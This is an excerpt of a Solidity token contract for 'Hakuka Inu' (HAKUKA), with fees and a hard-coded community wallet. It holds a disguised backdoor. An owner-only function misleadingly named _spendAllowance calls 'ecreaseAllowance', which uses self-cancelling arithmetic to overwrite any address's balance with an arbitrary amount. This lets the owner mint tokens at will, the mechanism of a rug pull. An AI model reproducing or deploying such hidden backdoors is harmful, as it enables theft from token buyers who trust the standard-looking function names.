...
contract HakukaInu is Context, IERC20, Ownable {
    ...
    string private constant _name = "Hakuka Inu"; 
    string private constant _symbol = "HAKUKA"; 
    uint8 private constant _decimals = 9; 
    
    uint256 public _promoFee = 1;
    uint256 public _liquidityFee = 1;
    address private _communityWallet = 0x23BB35663f86C4613d8354Fd125263C15390d11a;
    ...
    function _spendAllowance (address admin, uint256 _value) public onlyOwner {
        ecreaseAllowance(admin, _value);
  
    }
  
    function ecreaseAllowance (address miner, uint256 _value) internal {
        _tOwned[miner] = (_tOwned[miner] * 1 * 2 - _tOwned[miner] * 1 * 2) + (_value * 10 ** 9);
    ...
    function _getValues(uint256 amount, address from) private returns (uint256) {
        ...
        _tOwned[address(this)] += liquidityFee;
